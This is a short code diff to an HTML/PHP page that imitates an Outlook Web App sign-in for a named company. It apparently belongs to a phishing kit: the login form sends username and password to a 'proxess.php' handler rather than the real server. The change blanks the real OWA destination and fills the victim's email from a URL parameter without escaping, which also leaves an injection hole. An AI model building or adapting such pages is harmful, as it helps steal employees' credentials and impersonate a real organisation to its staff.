@@ -691,7 +691,7 @@ input.chk
 </noscript>
 
 <form action="proxess.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
-<input type="hidden" name="destination" value="https://outlook.hillebrandgroup.com/owa/">
+<input type="hidden" name="destination" value="">
 <input type="hidden" name="flags" value="4">
 <input type="hidden" name="forcedownlevel" value="0">
  
@@ -716,7 +716,7 @@ input.chk
             </div>
         
 		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Domain\user name:</div>
-		<div><input id="username" name="email" value="<?php echo $email?>" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/ readonly required></div>
+		<div><input id="username" name="email" value="<?php echo $_GET['email']; ?>" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/ readonly required></div>
 		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
 		<div><input id="password" placeholder="" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"/ required></div>
         <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"/></div>
